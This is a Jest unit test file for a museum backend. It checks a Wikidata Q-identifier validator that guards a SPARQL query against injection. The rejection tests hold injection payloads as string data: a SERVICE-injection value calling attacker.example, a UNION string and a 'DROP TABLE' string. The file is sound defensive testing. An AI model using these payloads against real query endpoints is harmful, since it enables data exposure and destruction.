/**
 * RED — TD-SEC-WAVEA-01 — Wikidata Q-identifier validation guard.
 *
 * Locks down the defense-in-depth fix for security finding WAVE-A-SEC-M1
 * (`security-report.json`, MEDIUM): the `--museum=<value>` CLI flag at
 * `museum-backend/scripts/catalog-ingest.ts:396-398` accepts any string and
 * forwards it unchecked through `fetchArtworksOfMuseum` → `buildArtworksOfMuseumSparql`
 * (`museum-backend/scripts/catalog-ingest.helpers.ts:133-147`) where the value
 * is interpolated TWICE into the SPARQL template (`wd:${museumQid}` on line
 * 137 and `BIND(wd:${museumQid} AS ?museum)` on line 143).
 *
 * `--museum-id=<int>` is strict-validated (Number.parseInt + Number.isInteger
 * + > 0, see catalog-ingest.ts:405-410) — `--museum=<Qid>` MUST be brought
 * up to the same standard.
 *
 * Contract:
 *   - `validateWikidataQid(s: string): boolean` is exported from
 *     `museum-backend/scripts/catalog-ingest.helpers.ts`.
 *   - Returns `true` iff the input matches the canonical Wikidata Q-identifier
 *     pattern: leading `Q`, first digit in `[1-9]`, then 0..18 more digits.
 *     Regex: `/^Q[1-9][0-9]{0,18}$/`.
 *   - Returns `false` for every other input: empty string, leading zero,
 *     lowercase `q`, whitespace padding, embedded newline, lone `Q`, `Q0`,
 *     SPARQL injection payloads, lengths > 19 digits, non-`Q` prefixes.
 *
 * This test is RED until the editor lands `validateWikidataQid`. The current
 * `catalog-ingest.helpers.ts` exports `mapLicenseUriToSlug`,
 * `fetchArtworksOfMuseum`, `downloadThumbnail`, `normalizeMetadata`, and the
 * type `ArtworkSeed` — none of which provide Qid validation.
 */

// `describe`, `it`, `expect` are provided as globals by Jest + @types/jest.
// Explicit imports from `@jest/globals` are intentionally avoided — the
// package is not installed here (jest@29 ships globals via the test runner).

// SUT — `scripts/` lives outside `src/` so no path alias applies. Dynamic
// require so the failure surfaces as a useful Jest error message ("function
// is not a function" / "Cannot find module") rather than a TS compile error
// that would prevent the RED phase from running at all.
// eslint-disable-next-line @typescript-eslint/no-require-imports -- dynamic SUT load to surface a useful Jest failure when the export is missing
const helpers = require('../../../scripts/catalog-ingest.helpers') as {
  validateWikidataQid: (s: string) => boolean;
};

describe('catalog-ingest.helpers — validateWikidataQid (TD-SEC-WAVEA-01)', () => {
  describe('canonical accepts — `^Q[1-9][0-9]{0,18}$`', () => {
    // The Q-identifier of the Pont de Pierre (Bordeaux) — used by the
    // monument-photo V1 demo data, cf. CLAUDE.md project overview.
    it('accepts Q1773424 (Pont de Pierre, Bordeaux)', () => {
      expect(helpers.validateWikidataQid('Q1773424')).toBe(true);
    });

    // One of the 3 Bordeaux demo museums verified in
    // `reference_bordeaux_museum_qcodes.md`.
    it("accepts Q3329534 (Musée d'Aquitaine)", () => {
      expect(helpers.validateWikidataQid('Q3329534')).toBe(true);
    });

    // The Wikidata Q-identifier for the "public domain" license entity used
    // by the C2 license URI mapping (helpers.ts:54).
    it('accepts Q19652 (public-domain license entity)', () => {
      expect(helpers.validateWikidataQid('Q19652')).toBe(true);
    });

    // Lower-bound legal Qid (smallest non-zero leading digit, one digit).
    it('accepts Q1 (smallest legal Qid)', () => {
      expect(helpers.validateWikidataQid('Q1')).toBe(true);
    });
  });

  describe('rejects — empty / malformed', () => {
    it('rejects the empty string', () => {
      expect(helpers.validateWikidataQid('')).toBe(false);
    });

    it('rejects a lone `Q` with no digits', () => {
      expect(helpers.validateWikidataQid('Q')).toBe(false);
    });

    it('rejects `Q0` (Wikidata Qids start at Q1)', () => {
      expect(helpers.validateWikidataQid('Q0')).toBe(false);
    });

    it('rejects `Q01` (leading zero)', () => {
      expect(helpers.validateWikidataQid('Q01')).toBe(false);
    });

    it('rejects `q19652` (lowercase prefix)', () => {
      expect(helpers.validateWikidataQid('q19652')).toBe(false);
    });

    it('rejects `42abc` (no `Q` prefix)', () => {
      expect(helpers.validateWikidataQid('42abc')).toBe(false);
    });

    it('rejects a string with leading whitespace', () => {
      expect(helpers.validateWikidataQid('  Q1773424')).toBe(false);
    });

    it('rejects a string with an embedded newline', () => {
      expect(helpers.validateWikidataQid('Q1773424\n')).toBe(false);
    });

    it('rejects a Qid with more than 19 digits (overflow guard)', () => {
      // 21 digits after Q — far beyond any real Wikidata Qid (~9 digits today).
      expect(helpers.validateWikidataQid('Q123456789012345678901')).toBe(false);
    });
  });

  describe('rejects — SPARQL injection payloads (defense-in-depth, WAVE-A-SEC-M1)', () => {
    // The reproduction payload from security-report.json — a crafted value
    // that escapes the triple pattern at helpers.ts:137 and tries to
    // instantiate a federated SERVICE call.
    it('rejects a SERVICE-injection payload', () => {
      expect(
        helpers.validateWikidataQid('Q1.} SERVICE <http://attacker.example/sparql> { ?a ?b ?c } #'),
      ).toBe(false);
    });

    it('rejects a UNION-injection payload', () => {
      expect(helpers.validateWikidataQid('Q1773424 UNION SELECT')).toBe(false);
    });

    it('rejects a SQL-style `DROP TABLE` payload (defense-in-depth)', () => {
      expect(helpers.validateWikidataQid('Q1773424; DROP TABLE--')).toBe(false);
    });
  });
});
